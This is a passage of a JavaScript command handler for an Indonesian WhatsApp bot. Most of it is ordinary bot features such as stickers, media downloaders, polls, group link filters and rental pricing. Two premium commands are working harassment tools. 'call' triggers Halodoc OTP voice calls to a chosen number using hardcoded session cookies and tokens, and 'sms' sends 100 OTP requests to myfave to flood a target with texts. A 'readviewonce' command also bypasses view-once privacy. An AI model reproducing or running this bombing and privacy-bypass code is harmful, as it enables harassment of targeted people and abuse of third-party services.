│• ʟɪᴍɪᴛ ᴅᴀɴ ʟɪᴍɪᴛ ɢᴀᴍᴇ ᴛᴀɴᴘᴀ ʙᴀᴛᴀꜱ
│• ᴄʟᴀɪᴍ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴇxᴘ ʜᴀʀɪᴀɴ
│• ᴜʙᴀʜ ᴡᴀᴛᴇʀᴍᴀʀᴋ ꜱᴛɪᴄᴋᴇʀ
│• ᴅᴀɴ ᴍᴀꜱɪ ʙᴀɴʏᴀᴋ ʟᴀɢɪ
╰─────────❍



*ᴘᴀʏᴍᴇɴᴛ*:
𖦹 ᴅᴀɴᴀ
𖦹 ᴘᴜʟꜱᴀ
- 


_ꜱɪʟᴀʜᴋᴀɴ ᴋᴇᴛɪᴋ .ᴏᴡɴᴇʀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴇᴛᴀʜᴜɪ ᴘᴇᴍɪʟɪᴋ ʙᴏᴛ ɪɴɪ_`
        reply(asuu)
              break
case 'sewaa':
if (isBan) return reply('*Lu Di Ban Owner*')
await loading()
m.reply(`𝙋𝙧𝙞𝙘𝙚 𝙎𝙚𝙬𝙖 ${global.botname}

🗓️ 3 hari = Rp.2000
🗓️ 1 minggu = Rp.5000
🗓️ 2 minggu = Rp.8000
🗓️ 1 bulan = Rp.10000

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh .sewabot 1 minggu*`)
break
//=================================================//

    case 'sewabot':
    if (!isPrem) return reply(mess.prem);
if (isBan) return reply('*Lu Di Ban Owner*')
if (!text) return reply(`*Contoh* :\n#sewabot 1 minggu `)
await loading()
let cret = await conn.groupCreate(args.join(" "), [])
let response = await conn.groupInviteCode(cret.id)
conn.sendMessage(m.sender, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : ${botname}_
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} _https://chat.whatsapp.com/${response}_

!! *PANDUAN* !!

• JIKA INGIN MEMASUKAN BOT KE DALAM GRUP ANDA SILAHKAN KETIK : .join url gc anda
• JANGAN MELAKUKAN SPAM BERIKAN JEDA MINIMAL 5 DETIK
• JIKA ANDA MENELEPON ATAU MENYEPAM BOT MAKA ANDA AKAN DI HAPUS DARI DAFTAR SEWA!!
• GUNAKAN BOT DENGAN BIJAK 
`, quoted: fkontak})
reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break
//=================================================//
case 'sticker': case 'colong': case 's': case 'stickergif': case 'sgif': {
    if (global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
 if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
        reply('_1 Limit Terpakai ✔️_')
break
//=================================================//
case 'inspect': {
if (isBan) return reply('*Lu Di Ban Owner*')
if (!args[0]) return reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
conn.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By ${botname}`
try {
pp = await conn.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
conn.sendFile(from, pp, "", m, { caption: tekse, mentions: await conn.parseMention(tekse) })

})
}
break
//=================================================
case 'ytvid': 
case 'ytvideo': {

conn.sendMessage(from, { react: { text: '♻️', key: m.key }})

const videoh = require('./Media/lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !videoh.isYTUrl(text)) reply(`Kirim Link Video YouTube ❗`)
const vid=await videoh.mp4(text)
const ytc=`
Judul: ${vid.title}
Tanggal: ${vid.date}
Durasi: ${vid.duration}
Kualitas: ${vid.quality}`
await conn.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc,
    gifPlayback: true
},{quoted:m})
}
break
//++++++//
case 'poll': {
if (!m.isGroup) return reply(mess.grouponly)
            let [poll, opt] = text.split('|')
            if (text.split('|') < 2)
                return await reply(
                    `Contoh: ${prefix}poll p|pp`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await conn.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
//+++++++//
case "welcome":
{
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
await loading()
if (args[0] === "on") {
if (welcm) return reply('Sudah Aktif')
wlcm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
reply('Sukses Mematikan Welcome  di group ini')
}
}
break
//=================================================
case 'bcgc': case 'bcgroup': {
if (!isPrem) return reply(mess.prem)
if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
await loading()
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
conn.sendMessage(i, {text: `${text}`}, {quoted:fkontak})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
        case 'readvo': case 'readviewonce': {
if (isBan) return reply('Lu di ban kocak awokwok') 
if (!m.quoted) return m.reply('Reply gambar/video yang ingin Anda lihat')
  if (m.quoted.mtype !== 'viewOnceMessageV2') return m.reply('Ini bukan pesan view-once.')
  let msg = m.quoted.message
  let type = Object.keys(msg)[0]
  let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
  let buffer = Buffer.from([])
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk])
  }
  if (/video/.test(type)) {
    return conn.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
  } else if (/image/.test(type)) {
    return conn.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
  }
}
break
//=================================================//
case 'antilink': {

if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('🚩 Succes menyalakan antilink di group ini ')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('🚩 Succes mematikan antilink di group ini ')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
        case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply('Success in turning on twitter antilink in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return m.reply('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply('Success in turning off twitter antilink in this group')
} else {
  await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
//=================================================
case 'antilinkall': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
m.reply('Success in turning on all antilink in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return m.reply('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
m.reply('Success in turning off all antilink in this group')
} else {
  await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
//=================================================
case "antitoxic":
{

if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')

if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:fkontak})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Non Aktif')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break
//=================================================
case 'larangan': case 'peraturan': {
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
conn.sendMessage(from, { text : `Haii 👋 Aku ${botname}
Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!

Larangan !!!
fuck
ajg
anjing
ngentod
bangsat
bgst
babi
kontol
memek
penis
pukimak
tolol
gblg
gblok` , mentions: participants.map(a => a.id)}, {quoted:fkontak})
}
break
//=================================================//
case 'p':
    
    conn.sendMessage(from, { react: { text: '❌', key: m.key }})
        
    reply(`Mohon Ucapkan Salam ❗`)
    break
//=====//
case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': case'kontol': case'memek': case'penis': case 'ngewe': case 'yatim': case 'piatu': case 'pentil': case 'pepek': case 'tempi': case 'tempe': case 'bajingan': case 'ndasmu':{
if (!welcmm) return
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin sudah Toxic, admin bebas Toxic apapun`})
if (isCreator) return conn.sendMessage(m.chat, {text: `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\Owner telah Toxic, owner bebas Toxic apa pun`})
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
conn.sendMessage(from, {text:`\`\`\`「 Kata Kata Toxic Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan toxic di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:fkontak})
}
break
//=================================================//
case "call":
if (!isPrem) return reply(mess.prem)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +62345678910`)
await loading()
let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+62345678910`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
//=================================================
case 'sms': {
if (!isPrem) return reply(mess.prem)
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms == owner) return reply('Tidak bisa spam ke nomor ini!')
await loading()
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY ${ownername}`);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +62345678910`)
m.reply(`spam sms/call akan di kirim ke no target`)
}
break
//=================================================//

        case 'play3': case 'song3': {
    if (!text) return reply(`*[ Masukan Judul / Link Dari YouTube! ]*
> EXAMPLE: PLAY JJ SAD`)
    reply(mess.wait)
    try {
    var search = await youtube(text);
    var convert = search.videos[0];
    if (!convert) return reply('*Video/Audio not found*')
    if (convert.seconds >= 3600) {
    return reply('*Video is longer than 1 hour!*');
    } else {
    var audioUrl
    try {
    audioUrl = `https://aemt.me/downloadAudio?URL=${convert.url}&videoName=ytdl`
    } catch (e) {
    audioUrl = `https://yt.tioo.eu.org/youtube?url=${convert.url}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`
    }
   /** var build = await fetch(convert.thumbnail)
    var buffer = await build.buffer()
    var image = await uploadImage(buffer) */
    var caption = `${ta} *Title* : *${convert.title}*\n${ta} *Ext :* *Search*\n${ta} *ID :* *${convert.videoId}*\n${ta} *Duration :* *${convert.timestamp}*\n${ta} *Viewers :* *${convert.views}*\n${ta} *Upload At :* *${convert.ago}*\n${ta} *Author :* *${convert.author.name}*\n${ta} *Channel :* *${convert.author.url}*\n${ta} *Url :* *${convert.url}*\n${ta} *Description :* *${convert.description}*\n${ta} *Thumbnail:* *${convert.image}*`;
    var pesan = conn.relayMessage(m.chat, { extendedTextMessage:{ text: caption, contextInfo: { externalAdReply: { title: "Powered by", mediaType: 1, previewType: 0, renderLargerThumbnail: true,thumbnailUrl: convert.image, sourceUrl: `${convert.url}` }}, mentions: [m.sender]}}, {})
    conn.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mpeg', }, { quoted: m });
    }
    } catch (e) {
    reply(`*Error:* ` + e);
    } 
    }
break
//=================================================
case 'getmusic': {
if (!isCreator) return m.reply('*khusus Premium*')
if (!text) return m.reply(`Example : ${prefix + command} 1`)
if (!m.quoted) return m.reply('Reply Pesan')
if (!m.quoted.isBaileys) return m.reply(`Hanya Bisa Membalas Pesan Dari Bot`)
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang anda reply tidak mengandung result ytsearch`)
await loading ()
downloadMp3(urls[text - 1])
}
break
//=================================================
case 'getvideo': {
if (!isCreator) return m.reply('*khusus Premium*')
let { ytv } = require('./lib/y2mate')
if (!text) return m.reply(`Example : ${prefix + command} 1`)
if (!m.quoted) return m.reply('Reply Pesan')
if (!m.quoted.isBaileys) return m.reply(`Hanya Bisa Membalas Pesan Dari Bot`)
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang anda reply tidak mengandung result ytsearch`)
let quality = args[1] ? args[1] : '360p'
let media = await ytv(urls[text - 1], quality)
if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
conn.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
//=================================================
case "ytreels": case "youtubereels":{
if (!isCreator) return m.reply('*khusus Premium*')
if (!text) return m.reply('Masukan Link Nya!!!')
await loading ()
downloadMp4(text)
}
break
//=================================================

//=================================================
		
		case 'fbvideo':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
			await loading()
			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikeys}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn` })
			})
			break
			
			case 'twitvideo':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
			axios.get(`https://api.lolhuman.xyz/api/twitter?apikey=${apikeys}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(from, { video: { url: data.result.link[data.result.link.length - 1].link }, mimetype: 'video/mp4' })
			})
			break
//=================================================//
case 'wm': {
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')

let teks = `${text}`
{
 if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(from, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
}
}
}
break
//=================================================//
case 'wmvideo':{
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')

let teks = `${text}`
{
 if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(from, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
}
break
//=================================================//
        case'blackpink':case'rainbow2':case'water_pipe':case'halloween':case'sketch':case'sircuit':case'discovery':case'metallic2':case'fiction':case'demon':case'transformer':case'berry':case'thunder':case'magma':case'3dstone':case'neon':case'glitch':case'harry_potter':case'embossed':case'broken':case'papercut':case'gradient':case'glossy':case'watercolor':case'multicolor':case'neon_devil':case'underwater':case'bear':case'wonderfulg':case'christmas':case'neon_light':case'snow':case'cloudsky':case'luxury2':case'gradient2':case'summer':case'writing':case'engraved':case'summery':case'3dglue':case'metaldark':case'neonlight':case'oscar':case'minion':case'holographic':case'purple':case'glossyb':case'deluxe2':case'glossyc':case'fabric':case'neonc':case'newyear':case'newyear2':case'metals':case'xmas':case'blood':case'darkg':case'joker':case'wicker':case'natural':case'firework':case'skeleton':case'balloon':case'balloon2':case'balloon3':case'balloon4':case'balloon5':case'balloon6':case'balloon7':case'steel':case'gloss':case'denim':case'decorate':case'decorate2':case'peridot':case'rock':case'glass':case'glass2':case'glass3':case'glass4':case'glass5':case'glass6':case'glass7':case'glass8':case'captain_as2':case'robot':case'equalizer':case'toxic':case'sparkling':case'sparkling2':case'sparkling3':case'sparkling4':case'sparkling5':case'sparkling6':case'sparkling7':case'decorative':case'chocolate':case'strawberry':case'koifish':case'bread':case'matrix':case'blood2':case'neonligth2':case'thunder2':case'3dbox':case'neon2':case'roadw':case'bokeh':case'gneon':case'advanced':case'dropwater':case'wall':case'chrismast':case'honey':case'drug':case'marble':case'marble2':case'ice':case'juice':case'rusty':case'abstra':case'biscuit':case'wood':case'scifi':case'metalr':case'purpleg':case'shiny': case'jewelry':case'jewelry2':case'jewelry3':case'jewelry4':case'jewelry5':case'jewelry6':case'jewelry7':case'jewelry8':case'metalh':case'golden':case'glitter':case'glitter2':case'glitter3':case'glitter4':case'glitter5':case'glitter6':case'glitter7':case'metale':case'carbon':case'candy':case'metalb':case'gemb':case'3dchrome':case'metalb2':case'metalg':
{
if (isBan) return reply('Lu di ban kocak awokwok') 
if (!text) return reply(`Gunakan dengan cara .${command} *text*`)
conn.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let texpro = await getBuffer(`https://api.zeeoneofc.my.id/api/textpro/${command}?text=${q}&apikey=junaa`)
try{
await conn.sendMessage(m.chat, {image: texpro, caption: "Done kak"}, {quoted: m})
conn.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
} catch (err){
reply(`error`) 
}
}
break
//=================================================//
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
